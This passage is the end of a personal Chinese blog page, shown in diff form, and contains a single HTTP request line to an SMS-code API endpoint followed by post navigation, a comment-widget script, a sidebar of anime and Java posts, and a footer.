+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>/prod-api/resource/sms/code?phoneNumber=1888888888 HTTP/1.1
+</code></pre></div></div><hr /><div class="post-navs d-flex mb-3 justify-content-between">
+  <div class="post-nav w-50"><div class="prev-post btn btn-sm">
+      <a href="/posts/anime/bokugashinouto/">僕が死のうと思ったのは
+</a>
+    </div></div>
+  <div class="post-nav flex-row-reverse"><div class="next-post btn btn-sm">
+      <a href="/posts/tech/sec-read-20240324/">3.24学习记录
+</a>
+    </div></div>
+</div><section class="related-posts">
+    <h3>相关文章</h3>
+    <ul class="related-posts"><li><a href="/posts/anime/bokugashinouto/">僕が死のうと思ったのは
+</a></li><li><a href="/posts/anime/shinainaru/"> 親愛なる世界へ
+</a></li><li><a href="/posts/anime/kimigahikarini/">君が光に変えて行く
+</a></li><li><a href="/posts/anime/fairytale/">Fairytale
+</a></li><li><a href="/posts/anime/kizuato/">傷跡
+</a></li></ul>
+  </section></article>
+
+
+
+
+<div id="vcomments" class="post-comments surface row">
+</div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: '18xpdRPZMKmyTjmjtMIK8zyB-gzGzoHsz',
+            appKey: 'haH3Ysz9ic7RFcoqbIvPDh8H',
+            avatar:'retro',
+            visitor:true,
+            placeholder:'有什么想说的吗？'
+
+        });
+
+        var count = 0;
+        var domTimer = setInterval(function () {
+            if (++count > 50) clearInterval(domTimer);
+            if (document.querySelector('#veditor')) {
+                clearInterval(domTimer);
+                var cdraw = new CaveDraw({
+                    element: "#veditor",
+                    readOnlyMode: false, 
+                    afterUpdateEditor: ()=>{ 
+                        document.querySelector('#veditor').focus();
+                        document.querySelector('#veditor').blur();
+                    },
+                    controls: ['brush', 'eraser', 'bucket', 'clear', 'undo', 'redo', 'save']
+                });
+            }
+        }, 200);
+    </script></div>
+</div><aside class="col-lg-4 sidebar d-flex">
+  <div class="container"><section class="profile surface row">
+  <div class="col-xl-6 d-flex align-items-center justify-content-center">
+    <img class="profile-avatar img-fluid" src="/images/profile2.jpg" alt="理想奈" loading="lazy">
+  </div>
+  <div class="col-xl-6">
+    <h5 class="profile-name my-2">理想奈</h5><div class="profile-bio mb-2">我爱马克思! 我爱辩证法!</div>
+    
+  </div>
+</section><section class="recent-posts row surface">
+  <h4>最近文章</h4>
+  <ul><li><a href="/posts/tech/java-0-audition-3/">软件维护管理面试
+</a></li><li><a href="/posts/tech/java-0-audition-2/">京东笔试准备&amp;牛客网刷题
+</a></li><li><a href="/posts/tech/java-6-autoconfiguration/">项目: Swagger的自动装配
+</a></li><li><a href="/posts/tech/java-5-algorithm/">算法刷题
+</a></li><li><a href="/posts/tech/java-4-basic/">Java基础查漏补缺
+</a></li><li><a href="/posts/tech/java-2-mysql/">MySQL学习笔记
+</a></li><li><a href="/posts/tech/java-3-spring-cloud/">SpringCloud学习笔记
+</a></li></ul>
+</section><section class="taxonomy-categories row surface">
+      <h4>
+        <a href="/categories">分类</a>
+      </h4>
+      <div><a href="/categories/%E4%BA%8C%E6%AC%A1%E5%85%83/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="二次元">
+          二次元 <span class="badge rounded-pill">24</span>
+        </a><a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="计算机">
+          计算机 <span class="badge rounded-pill">15</span>
+        </a><a href="/categories/%E6%96%87%E5%AD%97%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="文字类">
+          文字类 <span class="badge rounded-pill">6</span>
+        </a><a href="/categories/%E6%99%AE%E9%80%9A%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="普通类">
+          普通类 <span class="badge rounded-pill">5</span>
+        </a></div>
+    </section><section class="taxonomy-series row surface">
+      <h4>
+        <a href="/series">专栏</a>
+      </h4>
+      <div><a href="/series/%E5%8A%A8%E6%BC%AB%E6%AD%8C%E6%9B%B2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="动漫歌曲">
+          动漫歌曲 <span class="badge rounded-pill">21</span>
+        </a><a href="/series/galgame/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="Galgame">
+          Galgame <span class="badge rounded-pill">9</span>
+        </a><a href="/series/java/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="Java">
+          Java <span class="badge rounded-pill">9</span>
+        </a><a href="/series/%E5%AE%89%E5%85%A8/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="安全">
+          安全 <span class="badge rounded-pill">2</span>
+        </a></div>
+    </section></div>
+</aside>
+</div>
+    </main><footer class="footer mt-auto py-3 text-center container"><nav class="social-links nav my-2 justify-content-center"></nav>
+<div class="copyright mb-2">
+  Copyright © 2021-2024 Unaybaryl. All Rights Reserved.
+</div>
+</footer>
+<a id="btnScrollToTop" class="btn-scroll-to-top">
+  <i class="fas fa-fw fa-chevron-circle-up fa-2x"></i>
+</a>
+
+
+
+              
+            </body>
+</html>
